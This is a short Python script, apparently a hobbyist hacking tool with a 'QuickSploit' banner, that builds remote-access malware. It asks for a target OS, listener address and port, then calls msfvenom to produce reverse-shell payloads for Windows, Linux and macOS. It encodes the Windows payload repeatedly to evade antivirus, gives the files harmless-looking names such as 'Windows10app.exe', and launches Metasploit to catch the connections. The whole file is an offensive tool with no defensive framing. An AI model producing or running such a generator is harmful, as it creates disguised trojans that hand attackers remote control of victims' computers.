#!/usr/bin/env python3

import os
from colorama import Fore
print()
print(Fore.CYAN)
print("Welcom to")
print("╔═══╗──────╔╗───╔═══╗──╔╗────╔╗")
print("║╔═╗║──────║║───║╔═╗║──║║───╔╝╚╗")
print("║║─║╠╗╔╦╦══╣║╔╗─║╚══╦══╣║╔══╬╗╔╝")
print("║║─║║║║╠╣╔═╣╚╬╩═╬══╗║╔╗║║║╔╗╠╣║")
print("║╚═╝║╚╝║║╚═╣╔╬╦═╣╚═╝║╚╝║╚╣╚╝║║╚╗")
print("╚══╗╠══╩╩══╩╝╚╝─╚═══╣╔═╩═╩══╩╩═╝")
print("───╚╝───────────────║║")
print("────────────────────╚╝")

def menu():
    print('Chose a target OS: \n\nType(1) for Windows 10.\nType(2) for Linux.\nType(3) for Mac OS.')
    print()
    choice = input()
    

    if choice == '1':
        print()
        print(Fore.RED)
        lhost = str(input('Enter your LHOST='))
        lport = str(input('Enter a LPORT='))
        location = str(input('Enter file finish location:'))
        print()
        print('[VIRUS FOR WINDOWS CREATING]')
        print()
        print(Fore.GREEN)
        print('Virus name: Windows10app.exe')
        attack1 = os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -a x86 -e x86/shikata_ga_nai -i 24 -n 120 -b '\\x00\\xff' --platform windows -f exe -o {location}Windows10app.exe")

    if choice == '2':
        print()
        print(Fore.RED)
        lhost = str(input('Enter your LHOST='))
        lport = str(input('Enter a LPORT='))
        location = str(input('Enter file finish location:'))
        print()
        print('[VIRUS FOR LINUX CREATING]')
        print()
        print(Fore.GREEN)
        print('Virus name: Linux_app.elf')
        attack2 = os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {location}Linux_app.elf")

    if choice == '3':
        print()
        print(Fore.RED)
        lhost = str(input('Enter your LHOST='))
        lport = str(input('Enter a LPORT='))
        location = str(input('Enter file finish location:'))
        print()
        print('[VIRUS FOR MAC-OS CREATING]')
        print()
        print(Fore.GREEN)
        print('Virus name: MAC_app.macho')
        attack3 = os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o {location}MAC_app.macho")
        
menu()

print()
print('Opening Metasploit For YOU:\nSetup Your Payload For\nListening!!')
print()
print()
print()
print()
opener = os.system("msfconsole")